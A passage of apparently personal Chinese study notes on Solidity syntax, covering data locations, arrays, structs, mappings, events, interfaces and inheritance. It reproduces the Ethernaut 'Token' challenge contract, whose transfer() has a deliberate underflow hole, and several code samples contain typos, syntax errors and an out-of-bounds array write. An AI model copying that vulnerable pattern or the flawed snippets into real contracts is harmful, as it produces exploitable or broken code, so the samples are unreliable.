class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract contractName&#123;<br>constructor() payable&#123;&#125;<br>/* 以下为具体的合约内容 */<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>在 0.5.0 前，没有 <code>constructor</code> 关键字，使用合约同名的函数作为构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract old &#123;<br>uint sender;<br>function old(address _sender) public &#123;<br>sender = _sender;<br>&#125;<br>/* 以下为合约内容 */<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="修饰器"><a href="#修饰器" class="headerlink" title="修饰器"></a>修饰器</h3><p>修饰器（<code>modifier</code>）声明函数拥有的特性，主要适用场景为运行函数前的检查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier isOwner &#123;<br>require (msg.sender == owner);<br>_;<br>&#125;<br>function changeName(string _name) external isOwner returns(string) &#123;<br>    name = _name;<br>    return (name);<br>&#125;<br></code></pre></td></tr></table></figure><p>修饰器也可以有参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier isOwner(address who) &#123;<br>require (who == owner);<br>_;<br>&#125;<br>function changeOwner(address newOwner) public isOwner(who) returns(address) &#123;<br>owner = newOwner;<br>return (newOwner);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-变量数据存储和作用域"><a href="#6-变量数据存储和作用域" class="headerlink" title="6. 变量数据存储和作用域"></a>6. 变量数据存储和作用域</h2><h3 id="数据位置"><a href="#数据位置" class="headerlink" title="数据位置"></a>数据位置</h3><p>分为 <code>storage</code>, <code>memory</code>和 <code>calldata</code></p><ol><li><code>storage</code>: 状态变量默认，储存在链上，类似于硬盘，耗 gas 多</li><li><code>memory</code>: 临时储存在内存里，不上链，一般用于函数里的 <strong>参数</strong> 和 <strong>临时变量</strong>，尤其是如果返回数据类型是 <strong>变长</strong> 的情况下（string, array, bytes, 自定义结构）（理解为类似于动态数组存入了新元素导致变长）</li><li><code>calldata</code>: 类似于 <code>memory</code>, 不同点在于 <code>calldata</code> 不能修改，一般用于函数的参数</li></ol><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><p>包含数组（<code>array</code>）和结构体（<code>struct</code>），由于复杂且占用空间大，使用时必须声明储存位置</p><h4 id="1-数组-array"><a href="#1-数组-array" class="headerlink" title="1. 数组 array"></a>1. 数组 array</h4><p>用来储存一组同类型数据，分为 固定长度数组 和 可变长度数组 两种。</p><ul><li><p>固定长度数组 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint8[200] arr1;<br>bytes1[27] arr2;<br>address[4] arr3;<br></code></pre></td></tr></table></figure></li><li><p>可变长度数组（动态数组） </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint8[] arr4;<br>bytes1[] arr5;<br>address[] arr6;<br>bytes arr7;//与 arr5 相当<br></code></pre></td></tr></table></figure><ul><li>注： <code>bytes</code>  是数组，但不加 <code>[]</code>，不能用 <code>byte[]</code> 声明单字节数组，可以用 <code>bytes</code> 或 <code>bytes1[]</code>。其中，<code>bytes</code> 更省 gas。</li></ul></li></ul><h5 id="创建数组的规则"><a href="#创建数组的规则" class="headerlink" title="创建数组的规则"></a>创建数组的规则</h5><ul><li><p>对 <code>memory</code> 修饰的 <strong>动态数组</strong> ，用 new 创建，且声明后长度不能改变: </p><p><code>uint[] memory arr8 = new uint[](2);</code></p></li><li><p>初始化数组，用 <code>[]</code>，类型以第一个元素为准，未指定默认为符合条件的最小单位：</p><p><code>uint[5] arr4 = [1, 2, 3, 4, 5];</code> 默认为uint8 类型</p><p><code>uint[5] arr5 = [uint256(1), 2, ,3 ,4, 5];</code> 指定为 uint256 类型</p><p>动态数组要一个一个赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">arr8[0] = 0;<br>arr8[1] = 1;<br>arr8[2] = 2;<br></code></pre></td></tr></table></figure></li></ul><h5 id="数组成员"><a href="#数组成员" class="headerlink" title="数组成员"></a>数组成员</h5><p>用 <code>arr</code> 代替数组的变量名</p><ul><li><code>arr.length</code>: 数组的元素数量</li><li>以下为 <em>动态数组</em> 专属<ul><li><code>arr.push(x)</code>: 在数组最后添加一个 <code>x</code> 元素，不指定 <code>x</code> 默认为 <code>0</code></li><li><code>arr.pop();</code>: 移除最后一个元素</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract arrayTest &#123;<br>uint[] a1;<br>function arrTest () public returns(uint[] memory)&#123;<br>        uint[2] memory a = [uint(1),2];<br>        a1 = a;<br>        a1.push();<br>        return (a1);  <br>    &#125;<br>&#125;// a1 = [1, 2, 0]<br></code></pre></td></tr></table></figure><h4 id="2-结构体-struct"><a href="#2-结构体-struct" class="headerlink" title="2. 结构体 struct"></a>2. 结构体 struct</h4><p>大致与 C 相同</p><h5 id="创建结构体"><a href="#创建结构体" class="headerlink" title="创建结构体"></a>创建结构体</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Student &#123;// 创建结构体<br>uint id;<br>string name;<br>uint score;<br>&#125;<br><br>Student stuA;// 初始化 stuA<br></code></pre></td></tr></table></figure><h5 id="给结构体赋值"><a href="#给结构体赋值" class="headerlink" title="给结构体赋值"></a>给结构体赋值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 法1：创建一个 storage 的 struct 引用<br>function way1() external &#123;<br>Student storage _stu = stuA;<br>_stu.id = 22;<br>_stu.name = &quot;victifa&quot;;<br>_stu.score = 100;<br>&#125;   // _stu 和 stuA 均为上述值<br><br>// 法2：直接引用状态变量的 struct<br>function way2() external&#123;<br>    stuA.id = 23;<br>    stuA.name = &quot;victini&quot;;<br>    stuA.score = 101;<br>&#125;<br><br>// 法3：构造函数式<br>function way3() external &#123;<br>stuA = Student(24, &quot;tifa&quot;, 102);<br>&#125;<br><br>// 法4：key-value <br>function way4() external&#123;<br>stuA = Student(&#123;id: 25, name: &quot;tmp&quot;, score: 103&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><p>分为 3 种，分别是 状态变量，局部变量，全局变量，大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract contractName &#123;<br>// 在这里的都是状态变量<br><br>function 1 ··· &#123;<br>// 在这里的都是局部变量<br>&#125;<br><br>// 在这里的都是状态变量<br><br>function 2 ··· &#123;<br>// 在这里的都是局部变量<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-状态变量"><a href="#1-状态变量" class="headerlink" title="1. 状态变量"></a>1. 状态变量</h4><p>存在链上，所有合约内函数均可访问，耗 gas 多，在合约内、函数外声明，可以在函数里更改值</p><h4 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2. 局部变量"></a>2. 局部变量</h4><p>仅在函数中有效的变量，存在内存里，不上链，gas 低</p><h4 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3. 全局变量"></a>3. 全局变量</h4><p>都是 solidity 预留关键字，不用声明，在函数内直接用，具体看 <a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">官方文档</a>，常用的有如下几个：</p><ul><li><code>blockhash(uint blockNumber) returns (bytes32)</code>：给定区块的哈希，当 <code>blocknumber</code> 是最近 256 个区块之一时；否则返回零</li><li><code>block.number</code> (<code>uint</code>)：当前区块编号</li><li><code>block.timestamp</code> (<code>uint</code>)：当前区块的时间戳，以自 Unix 纪元以来的秒数表示</li><li><code>msg.data</code> (<code>bytes calldata</code>)：完整的 calldata</li><li><code>msg.sender</code> (<code>address</code>)：消息的发送者（当前调用）</li><li><code>msg.sig</code> (<code>bytes4</code>)：calldata 的前四个字节（即函数标识符）</li><li><code>msg.value</code> (<code>uint</code>)：与消息一起发送的 wei 数量</li><li><code>tx.origin</code> (<code>address</code>)：交易的发送者（完整调用链）</li></ul><h5 id="以太单位"><a href="#以太单位" class="headerlink" title="以太单位"></a>以太单位</h5><p>由于不存在小数点，用 0 代替，使用以太单位防止精度损失，处理货币交易</p><ul><li><code>wei</code>: 1</li><li><code>gwei</code>: 1e9</li><li><code>ether</code>: 1e18</li></ul><h5 id="时间单位"><a href="#时间单位" class="headerlink" title="时间单位"></a>时间单位</h5><ul><li><code>seconds</code>: 1</li><li><code>minutes</code>: 60 seconds = 60</li><li><code>hours</code>: 60 minutes  = 3600</li><li><code>days</code>: 24 hours = 86400</li><li><code>weeks</code>: 7days = 604800</li></ul><h4 id="4-示例"><a href="#4-示例" class="headerlink" title="4. 示例"></a>4. 示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract variables &#123;<br><br>uint x = 1;    // 状态变量1<br><br>function stateAndLocal () public &#123;<br>uint y = 2;// 局部变量<br>x = 10;    // 函数内改变状态变量1<br>&#125;<br>uint y;        // 状态变量2<br><br>function Global () public returns(uint,uint)&#123;<br>        address sender = msg.sender; // 全局变量，获取消息发送者（当前调用）的地址<br>        uint blockNum = block.number; // 全局变量，获取当前区块的 number（区块高度）<br>        bytes memory data = msg.data; // 全局变量，请求数据<br>        assert(1 ether == 1e18);<br>        assert(1 hours == 3600);<br>        return (1 ether,1 hours)<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据位置和赋值规则"><a href="#数据位置和赋值规则" class="headerlink" title="数据位置和赋值规则"></a>数据位置和赋值规则</h3><p>在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。规则如下：</p><ul><li><p>变化会被同步的（本质上 <strong>创建引用指向本体</strong>）：</p><ol><li><strong>状态变量</strong> <code>storage</code> 赋值给 <strong>函数里的</strong> <code>storage</code> 时</li><li><code>memory</code> 赋值给 <code>memory</code></li></ol></li><li><p>其他情况下，创建的是本体的 <strong>副本</strong>，变化不同步</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint[] x = [1,2,3]; // 默认为 storage<br><br>function change() public &#123;<br>uint[] storage y = x;<br>y[0] = 123; // 此时 x[0] = 123<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-映射类型"><a href="#7-映射类型" class="headerlink" title="7. 映射类型"></a>7. 映射类型</h2><h3 id="什么是映射？"><a href="#什么是映射？" class="headerlink" title="什么是映射？"></a>什么是映射？</h3><p>通过键（key）来查找值（value），声明格式为 <code>mapping(_KeyType =&gt; _ValueType)</code> ，例如：</p><p><code>mapping(uint =&gt; address) public idToAddress;    // 由 id 映射到 地址</code> </p><p><code>mapping(uint =&gt; uint) public idToScore;        // 由 id 映射到 成绩</code>                    </p><h3 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h3><ol><li><p><code>_KeyType</code> 只能是内置类型，<code>_ValueType</code> 才可以用自定义的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Student &#123;// 创建结构体<br>string name;<br>uint score;<br>&#125;<br>mapping (Student =&gt; uint) public test1; // 报错，key不可以用自定义类型<br>mapping (uint =&gt; Student) public test1;// 没毛病<br></code></pre></td></tr></table></figure></li><li><p>存储位置必须是 <code>storage</code> ，因此可用于状态变量，函数中的 <code>storge</code> 变量和 library函数的参数。不能用于 <code>public</code> 函数的参数或返回（mapping 记录的是<strong>键值对关系</strong>）</p></li><li><p>若声明为 <code>public</code> ，会自动创建 <code>getter</code>函数，通过 key 查 value</p></li><li><p>给映射新增键值对的语法 <code>_Var[_Key] = Value</code>，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function newMapping(uint _Key, uint _Value) public &#123;<br>idToScore[_Key] = _Value;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="映射的原理"><a href="#映射的原理" class="headerlink" title="映射的原理"></a>映射的原理</h3><ul><li><strong>原理1</strong>: 映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</li><li><strong>原理2</strong>: 映射使用<code>keccak256(abi.encodePacked(key, slot))</code>当成 offset 存取 value，其中 <code>slot</code> 是映射变量定义所在的插槽位置。</li><li><p><strong>原理3</strong>: 未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是各个type的默认值，如 uint 的默认值是0。（总算有句人话了）</p></li><li><p>看不懂</p></li></ul><h2 id="8-变量初始值"><a href="#8-变量初始值" class="headerlink" title="8. 变量初始值"></a>8. 变量初始值</h2><h3 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">boolfalse<br>string&quot;&quot;<br>int0<br>uint0<br>enum枚举中的第一个元素<br>address0x00···(40个0) 或 address(0)<br>bytes1          0x00<br>function<br>-internal空白函数<br>-external空白函数<br></code></pre></td></tr></table></figure><h3 id="引用类型-1"><a href="#引用类型-1" class="headerlink" title="引用类型"></a>引用类型</h3><ul><li>映射 <code>mapping</code>: 所有元素为默认值</li><li>结构体 <code>struct</code>: 所有成员为默认值</li><li>数组 <code>array</code><ul><li>静态数组（定长）: 所有成员为默认值</li><li>动态数组: <code>[]</code></li></ul></li></ul><h3 id="delete-操作符"><a href="#delete-操作符" class="headerlink" title="delete 操作符"></a><code>delete</code> 操作符</h3><p><code>delete a</code> 使 <code>a</code> 变为初始值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool _bool = true;<br>function test() external &#123;<br>delete _bool;// _bool 变为默认值 false<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-常数"><a href="#9-常数" class="headerlink" title="9. 常数"></a>9. 常数</h2><p>和常量相关的关键字 <code>constant</code>（常量）和 <code>immutable</code>（不变量）。好处是省 gas。</p><p>只有 <em>数值变量</em> 可以声明 <code>constant</code> 和 <code>immutable</code>，<code>string</code> 和 <code>bytes</code> 可以是 <code>constant</code>，不能是 <code>immutable</code>。</p><p> <code>constant</code> 和 <code>immutable</code> 变量在初始化后改变值均会报错。</p><h3 id="constant"><a href="#constant" class="headerlink" title="constant"></a>constant</h3><p><code>constant</code> 变量必须在声明时初始化，不可更改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint constant constNum = 123;<br>string constant constStr = &quot;victifa&quot;;<br>bytes constant constBytes = &quot;whatIsBytes&quot;;<br>address constant constAdd = 0x0000000000000000000000000000000000000000;<br>constNum = 12;// constant 不可改变，报错<br></code></pre></td></tr></table></figure><h3 id="immutable"><a href="#immutable" class="headerlink" title="immutable"></a>immutable</h3><p><code>immutable</code> 可以在声明或构造函数中初始化，在 <code>Solidity ^8.0.21</code> 后可以不显式初始化。若在声明和构造函数中均初始化，以构造函数为准。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint immutable imNum = 123;<br>uint immutable imNum2;<br>constructor()&#123;<br>imNUm = 199;<br>imNum2 = 200;<br>&#125;// imNum = 199, imNum2 = 200<br></code></pre></td></tr></table></figure><h2 id="10-控制流"><a href="#10-控制流" class="headerlink" title="10. 控制流"></a>10. 控制流</h2><p>与其他语言相似，主要包括：</p><ol><li><code>if-else</code></li><li><code>for循环</code></li><li><code>while循环</code></li><li><code>do-while循环</code></li><li>三元运算符 <code>a?x:y;</code></li></ol><p>例：冒泡排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br>contract sort &#123;<br>    function bubbleSort(uint[] memory arr) external pure returns(uint[] memory)&#123;<br>        uint tmp = 0;<br>        bool flag;<br>        for (uint i = 0; i &lt;= arr.length - 1; i++ ) &#123; <br>            flag = false;<br>            for (uint j = 0; j &lt; (arr.length - 1) - i; j++) &#123;<br>            // 此处写 j &lt;= arr.length-2-i 会报错，因为当 i 取到 arr.length-1 时，j 为 -1，不满足 uint 类型<br>                    if (arr[j] &gt; arr[j+1]) &#123;<br>                        tmp = arr[j];<br>                        arr[j] = arr[j + 1];<br>                        arr[j + 1] = tmp;<br>                        flag = true;<br>                    &#125;<br>            &#125;<br>            if (!flag) &#123;<br>                break;<br>            &#125;<br><br>        &#125;<br>        return (arr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-事件"><a href="#11-事件" class="headerlink" title="11. 事件"></a>11. 事件</h2><p>事件是 EVM 上日志的抽象，有两个特点：</p><ul><li>响应：应用程序（<a href="https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18"><code>ethers.js</code></a>）可以通过<code>RPC</code>接口订阅和监听这些事件，并在前端做响应。</li><li>经济：便宜，耗 gas 少</li></ul><h3 id="声明事件"><a href="#声明事件" class="headerlink" title="声明事件"></a>声明事件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event Transfer(address indexed from, address indexed to, uint value);<br></code></pre></td></tr></table></figure><p>如上事件记录了3个变量，其中 <code>from</code> 和 <code>to</code> 前有 <code>indexed</code> 关键字，会保存在 <code>topics</code> 中，方便检索。</p><h3 id="释放事件"><a href="#释放事件" class="headerlink" title="释放事件"></a>释放事件</h3><p>使用 <code>emit</code> 可以释放事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping (address =&gt; uint) public addrToNum;<br>function trans(<br>    address from,<br>    address to,<br>    uint value<br>) external &#123;<br>    addrToNum[from] = 100;// from初始有100块<br>    addrToNum[from] -= value;// 给 from 扣钱<br>    addrToNum[to] += value;// 给 to 加上等量从from处扣的钱<br>    emit Transfer(from, to, value);// 释放事件，产生一条 log<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="EVM-日志"><a href="#EVM-日志" class="headerlink" title="EVM 日志"></a>EVM 日志</h3><p>EVM 用 log 存储事件，每条日志包括主题 <code>topics</code> 和数据 <code>data</code></p><h4 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h4><ul><li>日志第一部分为长度不大于 4 的主题数组，第 1 个元素是事件的签名（哈希）</li><li>第二部分为 <code>indexed</code> 标记的参数（可以理解为检索事件的索引“键”），若参数太大，会自动计算哈希储存</li></ul><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><ul><li>不带 <code>indexed</code> 会被存在数据 <code>data</code> 中，可以理解为事件的“值”</li><li>不能被检索，但大小随意 —&gt; 储存复杂数据结构</li><li>耗 gas 比 主题 <code>topics</code> 少</li></ul><h2 id="12-抽象合约和接口"><a href="#12-抽象合约和接口" class="headerlink" title="12. 抽象合约和接口"></a>12. 抽象合约和接口</h2><h3 id="抽象合约"><a href="#抽象合约" class="headerlink" title="抽象合约"></a>抽象合约</h3><p>若合约中至少有一个未实现的函数（即函数缺少主体<code>&#123;&#125;</code>中的内容），必须将它标为 <code>abstract</code> ，并为为实现的函数标上 <code>virtual</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abstract contract bubbleSort &#123;<br>function a(uint _a) public pure returns(uint) &#123;<br>return (_a);<br>&#125;<br><br>function sort(uint[] memory _arr) external pure virtual returns(uint[] memory);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul><li><p>类似抽象合约，但不实现任何功能。规则：</p><ol><li>不能有 <mark>状态变量，修饰器</mark></li><li>不能有 <mark>构造函数</mark> </li><li>不能继承接口外的其他函数</li><li>接口中声明的函数 <strong>必须</strong> 是 <code>external</code>类型，且不能有函数体</li><li>继承接口的非抽象合约 <strong>必须</strong> 实现接口的==所有功能==</li></ol></li></ul><ul><li>接口提供的2个重要信息：<ol><li>合约每个函数的 <code>bytes4</code> 选择器以及函数签名 <code>函数名（每个参数类型）</code></li><li>接口id</li></ol></li></ul><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><p>存在接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface aniSound &#123;<br>    function sound() external returns(string memory);<br>&#125;<br></code></pre></td></tr></table></figure><p>已知链上已部署的两个函数 <code>cat</code> 和 <code>dog</code> 均使用了该接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract dog &#123;<br>    uint public volumn;<br>    function sound() external returns(string memory) &#123;<br>        volumn += 2;<br>        return (&quot;Wang!&quot;);<br>    &#125;<br>function a() ···<br>&#125;<br>contract cat&#123;<br>    uint public volumn;<br>    function sound() external returns(string memory) &#123;<br>        volumn++;<br>        return (&quot;miaow~&quot;);<br>    &#125;<br>    function b() ···<br>&#125;<br></code></pre></td></tr></table></figure><p>我们希望调用这两个函数，就可以通过两个函数的地址调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract ani&#123;<br>    function testSound(address _add) external returns(string memory) &#123;<br>        aniSound general = aniSound(_add);<br>        return general.sound();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>即：接口实现了一种规范，对函数的各个参数进行约束</p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p>对 Ethernaut 部署的合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br>    mapping(address =&gt; uint256) balances;<br>    uint256 public totalSupply;<br><br>    constructor(uint256 _initialSupply) public &#123;<br>        balances[msg.sender] = totalSupply = _initialSupply;<br>    &#125;<br><br>    function transfer(address _to, uint256 _value) public returns (bool) &#123;<br>        require(balances[msg.sender] - _value &gt;= 0);<br>        balances[msg.sender] -= _value;<br>        balances[_to] += _value;<br>        return true;<br>    &#125;<br><br>    function balanceOf(address _owner) public view returns (uint256 balance) &#123;<br>        return balances[_owner];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以使用 “接口+地址” 接入其中的函数，以便调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Token &#123;<br>     function transfer(address _to, uint256 _value) external returns (bool);<br>     function balanceOf(address _owner) external view returns (uint256 balance);<br>&#125;<br><br>contract moreTokens &#123;<br>    address addr;<br>    address wallet;<br>    constructor(address _contract) &#123;<br>        addr = _contract;<br>    &#125;<br>    function addToken() public &#123;<br>        Token(addr).transfer(msg.sender, 1);<br>    &#125;<br>    function getBalance(address _owner) public view returns (uint256 balance) &#123;<br>    blanace = Token(addr).balanceOf(address _owner);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-继承"><a href="#13-继承" class="headerlink" title="13. 继承"></a>13. 继承</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><ul><li><code>virtual</code>: 对 <strong>父合约</strong> 中的函数，若想在子合约里重写，加 <code>virtual</code>，有 <code>virtual</code> 不意味着必须改</li><li><code>override</code>: 对 子合约，要重写父合约中的函数，加 <code>override</code></li></ul><h3 id="简单的函数继承"><a href="#简单的函数继承" class="headerlink" title="简单的函数继承"></a>简单的函数继承</h3><p>以 <code>子合约 is 父合约</code> 形式继承，如下，在子合约 <code>ba</code> 中重写了 <code>yeA</code> 和 <code>yeB</code> 两个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 